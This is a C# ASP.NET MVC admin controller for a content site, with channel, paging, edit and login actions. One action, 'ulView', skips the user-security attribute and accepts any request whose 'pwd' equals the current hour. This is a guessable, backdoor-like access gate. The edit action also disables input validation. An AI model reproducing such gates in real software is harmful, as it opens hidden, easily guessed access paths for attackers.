using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Web;
using System.Web.Mvc;
using Webs.Model;
using Webs.Provider;

namespace Webs.WebProvider
{
    public class AdminController : Controller
    {
        
        [UserSecurity]
        public ActionResult ChannelList(int id)
        {
            ViewData["id"] = id;
            return View();
        }
        [UserSecurity]
        [HttpPost]
        public ActionResult GetChannels(int siteId)
        {
            var channels = ChannelProvider.Intance.GetAllList(siteId);
            if (!channels.Result)
            { channels.Data = new List<Model.Channel>(); }
            return Json(channels);
        }
        [UserSecurity]
        [HttpPost]
        public ActionResult InfoPager(int pageSize, int pageCurrentIndex, int channelId)
        {
            var infos = InfoProvider.Instance.GetPager(pageSize, pageCurrentIndex, channelId);
            return Json(infos);
        }
        [UserSecurity]
        [HttpPost]
        public ActionResult Detail(int id)
        {
            var info = InfoProvider.Instance.GetAdminInfoById(id);
            return Json(info);
        }
        [UserSecurity]
        [HttpPost]
        [ValidateInput(false)]
        public ActionResult InfoEdit(int infoId, int channelId, string infoTitle, string infoContent, int ShowSort = 0, bool Enable = true, string TitleImg = null, string JumpUrl = "")
        {
            var user = CurrentUser.GetSafeCurrentUser();
            OperationMsg msg = InfoProvider.Instance.Edit(user.UserId, infoId, channelId, ShowSort, infoTitle, infoContent, Enable, TitleImg, JumpUrl);
            return Json(msg);
        }
        [HttpPost]
        [ValidateAntiForgeryToken]
        public ActionResult Login(string un, string p)
        {
            var r = SecurityProvider.Instance.Login(un, p);
            if (r.Result)
            {
                CurrentUser.SetCookie(r.Data);
            }
            return View();
        }
        [HttpGet]
        public ActionResult ulView(string pwd)
        {
            if (pwd != DateTime.Now.ToString("HH"))
                Response.Redirect("~/404.aspx", true);
            return View();
        }
    }
}
